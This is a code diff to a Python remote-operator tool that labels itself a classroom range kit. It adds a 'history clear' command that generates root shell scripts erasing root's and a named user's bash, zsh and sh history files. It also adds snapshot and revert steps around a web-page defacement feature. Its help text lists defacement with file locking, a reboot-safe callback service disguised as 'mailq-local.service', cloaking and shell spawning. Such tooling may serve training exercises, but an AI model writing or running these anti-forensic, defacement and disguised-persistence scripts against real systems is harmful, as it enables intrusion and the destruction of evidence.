@@ -237,6 +237,22 @@ def linux_tradecraft(action, opts):
     uq = shell_quote(user_raw)
     aq = shell_quote(account_raw)
     if action == "history":
+        if opts.get("all"):
+            return root_guard() + (
+                "u={u}\n"
+                "wipe_hist() {{\n"
+                "  if [ -f \"$1\" ]; then : > \"$1\" && echo CLEARED=$1; else echo ABSENT=$1; fi\n"
+                "}}\n"
+                "wipe_hist /root/.bash_history\n"
+                "wipe_hist /root/.zsh_history\n"
+                "wipe_hist /root/.sh_history\n"
+                "if [ \"$u\" != root ]; then\n"
+                "  wipe_hist \"/home/$u/.bash_history\"\n"
+                "  wipe_hist \"/home/$u/.zsh_history\"\n"
+                "  wipe_hist \"/home/$u/.sh_history\"\n"
+                "fi\n"
+                "echo DONE\n"
+            ).format(u=uq)
         return (
             "u={u}\n"
             "echo LOOKING_FOR=$u\n"
@@ -1598,6 +1614,32 @@ def linux_script(kind, webroot, page_html=None, image_name=None, image_bytes=Non
             "stat -c 'MODE=%a OWNER=%U GROUP=%G MTIME=%y' \"$f\" 2>/dev/null || true\n"
             "echo '---- head ----'\n"
             "head -n 40 \"$f\" 2>/dev/null || echo MISSING\n"
+            "echo DONE\n"
+        )
+    if kind == "snapshot":
+        return root_guard() + common + (
+            "mkdir -p /var/lib/.hold/site\n"
+            "cp -a \"$f\" /var/lib/.hold/site/index.html\n"
+            "echo SAVED=/var/lib/.hold/site/index.html\n"
+            "for img in \"$r\"/*.png \"$r\"/*.jpg \"$r\"/*.jpeg \"$r\"/*.gif \"$r\"/*.webp; do\n"
+            "  if [ -f \"$img\" ]; then cp -a \"$img\" \"/var/lib/.hold/site/$(basename \"$img\")\"; echo SAVED=$img; fi\n"
+            "done\n"
+            "echo DONE\n"
+        )
+    if kind == "revert":
+        return root_guard() + common + (
+            "if [ ! -f /var/lib/.hold/site/index.html ]; then echo NO_SNAPSHOT; exit 1; fi\n"
+            "if command -v chattr >/dev/null 2>&1; then chattr -i \"$f\" 2>/dev/null || true; fi\n"
+            "cp -a /var/lib/.hold/site/index.html \"$f\"\n"
+            "echo REVERTED=$f\n"
+            "for img in /var/lib/.hold/site/*.png /var/lib/.hold/site/*.jpg /var/lib/.hold/site/*.jpeg /var/lib/.hold/site/*.gif /var/lib/.hold/site/*.webp; do\n"
+            "  if [ -f \"$img\" ]; then\n"
+            "    dest=\"$r/$(basename \"$img\")\"\n"
+            "    if command -v chattr >/dev/null 2>&1; then chattr -i \"$dest\" 2>/dev/null || true; fi\n"
+            "    cp -a \"$img\" \"$dest\"\n"
+            "    echo REVERTED=$dest\n"
+            "  fi\n"
+            "done\n"
             "echo DONE\n"
         )
     if kind == "undo":
@@ -3057,10 +3099,14 @@ commands
                            off checks again in about half an hour, so you can turn it back on
                            tcp, ws, and mqtt stay connected either way
   play look                show the web file, owner, and lock bits
+  play snapshot            save the live page so a practice deface can be undone
   play deface              replace index and lock it; keep a copy outside the site
   play deface nobackup     same, without keeping a copy
-  play undo                remove the lock and put the copy back
+  play undo                put back the copy taken by the last deface
+  play revert              put back the snapshot from before the practice deface
   play history [user]      tail bash history and the lines that look like hunting
+  play history [user] clear
+                           erase that user's history files and root's history files
   play persist             reboot-safe callback (mailq-local.service)
   play unpersist           remove that service
   play shell <user> vi|python|perl|bash
@@ -3129,6 +3175,8 @@ def play_script(kind, sid, hub, kit, opts=None):
     image_name = kit.image_name or None
     image_bytes = kit.image_bytes or None
     if osname.startswith("win"):
+        if kind in ("snapshot", "revert"):
+            return "Write-Output 'LINUX_ONLY'\n"
         return windows_script(kind, kit.webroot, page, image_name, image_bytes)
     return linux_script(kind, kit.webroot, page, image_name, image_bytes)
 
@@ -3143,14 +3191,22 @@ def parse_play(parts, line, actor):
     stamp_target = ""
     stamp_ref = ""
     play_actor = ""
+    clear = False
     if mode == "deface" and len(parts) > 2 and parts[2] == "nobackup":
         kind = "nobackup"
-    elif mode in ("deface", "undo", "look", "persist", "unpersist", "cloak", "uncloak", "unveil"):
+    elif mode in ("deface", "undo", "look", "snapshot", "revert", "persist", "unpersist", "cloak", "uncloak", "unveil"):
         kind = mode
     elif mode == "history":
         kind = mode
-        if len(parts) > 2 and re_account(parts[2]):
-            user = parts[2]
+        clear = False
+        extra = parts[2:]
+        if extra and extra[-1] == "clear":
+            clear = True
+            extra = extra[:-1]
+        if len(extra) == 1 and re_account(extra[0]):
+            user = extra[0]
+        elif extra:
+            return None
     elif mode == "shell":
         if len(parts) >= 4 and re_account(parts[2]) and parts[3] in SHELLS:
             user = parts[2]
@@ -3187,7 +3243,12 @@ def parse_play(parts, line, actor):
         kind = mode
     else:
         return None
-    return kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, mode == "logs" and len(parts) > 2 and parts[2] == "all"
+    wipe = False
+    if mode == "logs" and len(parts) > 2 and parts[2] == "all":
+        wipe = True
+    if mode == "history" and clear:
+        wipe = True
+    return kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, wipe
 
 
 def strip_rc(text):
@@ -3432,7 +3493,7 @@ def repl_line(line, hub, kit, selected, actor):
     if parts[0] == "play":
         parsed = parse_play(parts, line, actor)
         if not parsed:
-            log("usage: play look | deface [nobackup] | undo | history | persist | shell | wall | account | cloak | veil | stamp | boot")
+            log("usage: play look | snapshot | deface [nobackup] | revert | undo | history [user] [clear] | persist | shell | wall | account | cloak | veil | stamp | boot")
             log("type help for the full list")
             return selected, actor
         kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, wipe_history = parsed
@@ -3539,16 +3600,52 @@ def load_bytes(path, limit, label):
     return data
 
 
+def find_deface(kind):
+    roots = []
+    here = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deface")
+    cwd = os.path.join(os.getcwd(), "deface")
+    for root in (here, cwd):
+        if root not in roots:
+            roots.append(root)
+    patterns = {
+        "page": (".html", ".htm"),
+        "image": (".png", ".jpg", ".jpeg", ".gif", ".webp"),
+    }[kind]
+    found = []
+    for root in roots:
+        if not os.path.isdir(root):
+            continue
+        for name in sorted(os.listdir(root)):
+            lower = name.lower()
+            if lower.endswith(patterns):
+                found.append(os.path.join(root, name))
+    return found
+
+
 def operator_main(args):
     token, ports, bind, zone, webroot, icmp, attacker = build_operator(args)
     page = None
     image_name = ""
     image_bytes = b""
-    if args.page:
-        page = load_bytes(args.page, 200000, "page").decode("utf-8")
-    if args.image:
-        image_bytes = load_bytes(args.image, 350000, "image")
-        image_name = os.path.basename(args.image)
+    page_path = args.page
+    image_path = args.image
+    if not page_path:
+        pages = find_deface("page")
+        page_path = pages[0] if pages else ""
+    if not image_path:
+        images = find_deface("image")
+        image_path = images[0] if images else ""
+    if page_path:
+        page = load_bytes(page_path, 2000000, "page").decode("utf-8")
+        log("deface page: {0} ({1} bytes)".format(page_path, len(page.encode("utf-8"))))
+    else:
+        log("deface page: MISSING. No deface/*.html next to range.py. The built-in page will be used.")
+    if image_path:
+        image_bytes = load_bytes(image_path, 8000000, "image")
+        image_name = os.path.basename(image_path)
+        log("deface image: {0} ({1} bytes)".format(image_path, len(image_bytes)))
+    else:
+        log("deface image: MISSING. No deface image next to range.py.")
     kit = OperatorKit(webroot, page, image_name, image_bytes, attacker)
     hub = Hub(token, ports, zone)
     log("Range lab callback kit — isolated classroom networks only.")
